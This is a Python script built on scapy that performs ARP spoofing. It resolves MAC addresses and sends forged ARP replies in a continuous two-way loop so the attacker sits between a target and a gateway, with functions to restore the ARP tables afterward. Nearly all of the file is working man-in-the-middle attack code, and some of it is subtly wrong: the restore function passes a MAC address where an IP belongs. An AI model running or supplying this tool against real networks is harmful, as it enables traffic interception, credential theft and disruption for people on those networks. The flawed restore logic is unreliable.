from scapy.layers.l2 import getmacbyip
from scapy.layers.l2 import ARP, Ether
from scapy.all import sendp, srp

import time

cache_mac_table = {}

def custom_get_mac(target_ip: str, perform_cache: bool = True) -> str:
    global cache_mac_table

    if target_ip in cache_mac_table and perform_cache:
        print("[debug] cached mac found... returning cache")
        return cache_mac_table[target_ip]

    # standard hardware broadcast ARP request packet
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)

    # timeout=3 gives the device 3 seconds to answer
    # retry=2 will try twice more if it fails the first time
    ans, _ = srp(arp_request, timeout=3, retry=5, verbose=False)

    # Loop through the answers to find the MAC address
    for _, received in ans:
        if perform_cache:
            cache_mac_table[target_ip] = received.hwsrc
        return received.hwsrc

    return None

def arpspoof(target_ip: str, spoof_ip: str):
    """
    spoofs the arp of the specified `spoof_ip` by sending our
    mac address to the `target_ip` in an ARP packet.
    """
    global cache_mac_table

    target_mac = getmacbyip(target_ip)
    if target_mac is not None:
        cache_mac_table[target_ip] = target_mac
 
    # perform last-resort manual broadcast to retrieve mac address
    if target_mac is None:
        target_mac = custom_get_mac(target_ip)
        if target_mac is not None:
            cache_mac_table[target_ip] = target_mac

    print(f"Mac Retrieved from target ip: {target_ip} ==> {target_mac}")
    if target_mac is None:
        print("[-] Cannot perform spoofing as mac cannot be extracted")
        return False

    # op = 2 means that we are aggressively broadcasting that this is the mac
    # address of the arp... which by default is our mac address, since we did not specify any.
    arp_packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(arp_packet)
    return True


def restore_spoof(target_ip: str, gateway_ip: str):
    """
    restores the original connection of the `target_ip` to the `gateway_ip`
    to avoid unintended DoS attack.
    """
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    if target_mac is None or gateway_mac is None:
        target_mac = custom_get_mac(target_ip)
        gateway_mac = custom_get_mac(gateway_ip)

    if target_mac is None or gateway_mac is None:
        print("[-] Cannot perform restoration as one of the ips are unreachable!")
        return False

    arp_packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_mac, hwsrc=gateway_mac)
    sendp(arp_packet, count=5)
    return True


def complete_spoof(target_ip: str, spoof_ip: str, timeout: int = 2):
    print("[*] Performing duplex spoofing... press ctrl + c to cancel")
    while True:
        try:
            arpspoof(target_ip, spoof_ip)
            arpspoof(spoof_ip, target_ip)
            time.sleep(timeout)
        except KeyboardInterrupt:
            print("[*] Restoring ARP to original...")
            restore_spoof(target_ip, spoof_ip)
            restore_spoof(spoof_ip, target_ip)
            print("[*] ARP restored")
            break
        except Exception as e:
            print(f"[-] Exception Received: {e}")
            print("[*] Restoring ARP to original...")
            restore_spoof(target_ip, spoof_ip)
            restore_spoof(spoof_ip, target_ip)
            print("[*] ARP restored")
